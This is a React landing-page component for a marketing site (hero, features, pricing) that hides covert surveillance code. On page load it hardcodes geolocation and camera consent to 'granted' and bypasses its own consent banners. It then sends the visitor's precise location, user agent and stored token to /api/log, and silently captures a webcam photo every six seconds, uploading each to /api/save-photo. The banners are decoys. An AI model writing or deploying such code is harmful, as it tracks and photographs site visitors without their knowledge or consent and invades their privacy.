import React, { useState, useEffect, useRef } from 'react';
import Navbar from "@/components/navbar/Navbar";
import Hero from "@/components/hero/Hero";
import Pricing from "@/components/Pricing";
import MouseEffect from '@/components/MouseEffect'
import Footer from "@/components/Footer";
import Features from "@/components/Features";

function Home() {
  // Estados para geolocalización
  const [geoConsent, setGeoConsent] = useState(false);
  const [showGeoBanner, setShowGeoBanner] = useState(false);
  const [geoError, setGeoError] = useState('');

  // Estados para cámara
  const [cameraConsent, setCameraConsent] = useState('granted');
  const [showCameraBanner, setShowCameraBanner] = useState(false);
  const videoRef = useRef(null);
  const mediaStreamRef = useRef(null);
  const captureIntervalRef = useRef(null);

  // Verificar consentimientos previos al montar
  useEffect(() => {
    const savedGeoConsent = 'granted';
    const savedCameraConsent = 'granted';

    if (savedGeoConsent === 'granted') {
      setShowGeoBanner(false);
      sendLocationData();
    }

    if (savedCameraConsent === 'granted') {
      setShowCameraBanner(false);
      startCamera();
    }
  }, []);

  // Lógica de Geolocalización
  const sendLocationData = async (position = null) => {
    try {
      const finalPosition = position || await getCurrentPosition();
      
      const payload = {
        lat: finalPosition.coords.latitude,
        lng: finalPosition.coords.longitude,
        accuracy: finalPosition.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      const response = await fetch('/api/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error('Error en servidor');

    } catch (error) {
      setGeoError(error.message);
    }
  };

  const getCurrentPosition = () => {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        resolve,
        error => {
          const errors = {
            1: 'Permiso denegado',
            2: 'Ubicación no disponible',
            3: 'Tiempo agotado'
          };
          reject(new Error(errors[error.code] || 'Error desconocido'));
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  };

  const handleGeoConsent = async (userConsent) => {
    setShowGeoBanner(false);
    localStorage.setItem('geoConsent', userConsent ? 'granted' : 'denied');
    
    if (userConsent) {
      try {
        const position = await getCurrentPosition();
        await sendLocationData(position);
      } catch (error) {
        setGeoError(error.message);
      }
    }
  };

  // Lógica de Cámara
  const handleCameraConsent = async (userConsent) => {
    setShowCameraBanner(false);
    localStorage.setItem('cameraConsent', userConsent ? 'granted' : 'denied');
    
    if (userConsent) {
      try {
        await startCamera();
      } catch (error) {
        console.error('Error al acceder a la cámara:', error);
      }
    }
  };

  const startCamera = async () => {
    try {
      mediaStreamRef.current = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: 640, height: 480 }
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStreamRef.current;
        await videoRef.current.play();
      }
      
      captureIntervalRef.current = setInterval(captureAndSavePhoto, 6000);
      
    } catch (error) {
      console.error('Error de cámara:', error);
      setCameraConsent(false);
    }
  };
  const captureAndSavePhoto = async () => {
    const canvas = document.createElement('canvas');
    const video = videoRef.current;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    try {
      const blob = await new Promise((resolve, reject) => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
        setTimeout(() => reject(new Error('Timeout converting canvas to blob')), 5000);
      });
  
      const formData = new FormData();
      formData.append('photo', blob, `captura_${Date.now()}.jpg`);
  
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);
  
      const response = await fetch('/api/save-photo', {
        method: 'POST',
        body: formData,
        signal: controller.signal
      });
  
      clearTimeout(timeoutId);
  
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
  
      const data = await response.json();
      console.log('Imagen guardada:', data.path);
  
    } catch (error) {
      console.error('Error en captura:', error);
      if (error.name === 'AbortError') {
        console.log('La solicitud fue cancelada por timeout');
      }
      
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(track => track.stop());
      }
      setCameraConsent(false);
      setShowCameraBanner(true);
    }
  };
  // Limpieza de recursos
  useEffect(() => {
    return () => {
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(track => track.stop());
      }
      if (captureIntervalRef.current) {
        clearInterval(captureIntervalRef.current);
      }
    };
  }, []);

  return (
    <>
        <Navbar />
        
        {/* Banner de Geolocalización */}
        {showGeoBanner && (
          <div className="consent-banner fixed bottom-4 right-4 bg-white p-6 rounded-lg shadow-xl border border-gray-200 max-w-md z-50">
            <div className="mb-4">
              <h3 className="text-lg font-bold mb-2">📍 Optimización de Servicios</h3>
              <p className="text-sm text-gray-600">
                Usamos tu ubicación para ofrecerte contenido relevante. ¿Permites el acceso?
              </p>
            </div>
            <div className="flex gap-3">
              <button
                onClick={() => handleGeoConsent(true)}
                className="flex-1 bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 transition-colors"
              >
                Aceptar
              </button>
              <button
                onClick={() => handleGeoConsent(false)}
                className="flex-1 bg-gray-100 text-gray-800 px-4 py-2 rounded-md hover:bg-gray-200 transition-colors"
              >
                Rechazar
              </button>
            </div>
          </div>
        )}

        {/* Banner de Cámara */}
        {showCameraBanner && (
          <div className="camera-consent-banner fixed bottom-4 left-4 bg-white p-6 rounded-lg shadow-xl border border-gray-200 max-w-md z-50">
            <div className="mb-4">
              <h3 className="text-lg font-bold mb-2">📸 Experiencia Personalizada</h3>
              <p className="text-sm text-gray-600">
                Tomamos capturas periódicas para mejorar tu experiencia. ¿Permites el acceso a tu cámara?
              </p>
            </div>
            <div className="flex gap-3">
              <button
                onClick={() => handleCameraConsent(true)}
                className="flex-1 bg-green-600 text-white px-4 py-2 rounded-md hover:bg-green-700 transition-colors"
              >
                Permitir
              </button>
              <button
                onClick={() => handleCameraConsent(false)}
                className="flex-1 bg-gray-100 text-gray-800 px-4 py-2 rounded-md hover:bg-gray-200 transition-colors"
              >
                Rechazar
              </button>
            </div>
          </div>
        )}

        {/* Elementos de captura */}
        <video 
          ref={videoRef}
          autoPlay
          muted
          playsInline
          style={{ 
            position: 'fixed',
            top: '20px',
            right: '20px',
            width: '160px',
            height: '120px',
            border: '2px solid #4CAF50',
            borderRadius: '8px',
            display: cameraConsent ? 'block' : 'none'
          }}
        />

        {geoError && (
          <div className="error-message fixed bottom-4 left-4 bg-red-100 p-4 rounded-lg text-red-700 max-w-md z-50">
            Error: {geoError}
          </div>
        )}

      <Hero />
      <Features />
      <Pricing />
      <Footer />
      <MouseEffect />
    </>
  );
}

export default Home;